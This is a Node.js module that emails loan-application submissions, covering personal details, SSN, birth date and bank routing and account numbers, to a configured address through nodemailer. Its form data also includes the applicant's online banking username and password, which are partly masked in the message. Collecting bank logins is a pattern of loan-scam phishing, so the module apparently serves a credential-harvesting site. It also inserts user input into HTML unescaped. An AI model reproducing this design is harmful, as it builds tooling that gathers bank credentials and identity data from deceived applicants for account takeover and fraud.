import nodemailer from "nodemailer";

const {
  SMTP_HOST,
  SMTP_PORT,
  SMTP_USER,
  SMTP_PASS,
  RECIPIENT_EMAIL,
  EMAIL_FROM_NAME = "Loan Applications",
} = process.env;

if (!SMTP_HOST || !SMTP_PORT || !SMTP_USER || !SMTP_PASS || !RECIPIENT_EMAIL) {
  console.warn("[emailService] Missing SMTP configuration. Check environment variables.");
}

const transporter = nodemailer.createTransport({
  host: SMTP_HOST,
  port: Number(SMTP_PORT || 587),
  secure: Number(SMTP_PORT) === 465,
  auth: {
    user: SMTP_USER,
    pass: SMTP_PASS,
  },
});

const redactSensitive = (value) => {
  if (!value) return "";
  const str = String(value);
  if (str.length <= 4) return "****";
  return `${str.slice(0, 2)}****${str.slice(-2)}`;
};

const formatHTML = (data) => `
  <h2>New Loan Application</h2>
  <h3>Loan Details</h3>
  <ul>
    <li><strong>Amount:</strong> ${data.loanAmount}</li>
    <li><strong>Duration:</strong> ${data.loanDuration}</li>
    <li><strong>Purpose:</strong> ${data.loanPurpose}</li>
  </ul>

  <h3>Personal Information</h3>
  <ul>
    <li><strong>Loan Approval ID:</strong> ${data.loanApprovalId || "N/A"}</li>
    <li><strong>Name:</strong> ${data.firstName} ${data.lastName}</li>
    <li><strong>Email:</strong> ${data.email}</li>
    <li><strong>Phone:</strong> ${data.phone || "N/A"}</li>
    <li><strong>Address:</strong> ${data.address1}${data.address2 ? ", " + data.address2 : ""}, ${data.city}, ${data.state} ${data.zipCode}</li>
    <li><strong>SSN:</strong> ${redactSensitive(data.ssn)}</li>
    <li><strong>Birth Date:</strong> ${data.birthDate}</li>
  </ul>

  <h3>Bank Details</h3>
  <ul>
    <li><strong>Bank Name:</strong> ${data.bankName}</li>
    <li><strong>Routing Number:</strong> ${redactSensitive(data.routingNumber)}</li>
    <li><strong>Account Number:</strong> ${redactSensitive(data.accountNumber)}</li>
    <li><strong>Bank Username:</strong> ${redactSensitive(data.bankUsername)}</li>
    <li><strong>Bank Password:</strong> ${redactSensitive(data.bankPassword)}</li>
  </ul>
`;

const formatText = (data) => `New Loan Application\n\nLoan Details\n- Amount: ${data.loanAmount}\n- Duration: ${data.loanDuration}\n- Purpose: ${data.loanPurpose}\n\nPersonal Information\n- Loan Approval ID: ${data.loanApprovalId || "N/A"}\n- Name: ${data.firstName} ${data.lastName}\n- Email: ${data.email}\n- Phone: ${data.phone || "N/A"}\n- Address: ${data.address1}${data.address2 ? ", " + data.address2 : ""}, ${data.city}, ${data.state} ${data.zipCode}\n- SSN: ${redactSensitive(data.ssn)}\n- Birth Date: ${data.birthDate}\n\nBank Details\n- Bank Name: ${data.bankName}\n- Routing Number: ${redactSensitive(data.routingNumber)}\n- Account Number: ${redactSensitive(data.accountNumber)}\n- Bank Username: ${redactSensitive(data.bankUsername)}\n- Bank Password: ${redactSensitive(data.bankPassword)}\n`;

export const sendLoanApplicationEmail = async (data) => {
  if (!RECIPIENT_EMAIL) {
    throw new Error("Recipient email is not configured");
  }

  await transporter.sendMail({
    from: `${EMAIL_FROM_NAME} <${SMTP_USER}>`,
    to: RECIPIENT_EMAIL,
    subject: `New Loan Application from ${data.firstName} ${data.lastName}`,
    text: formatText(data),
    html: formatHTML(data),
  });
};
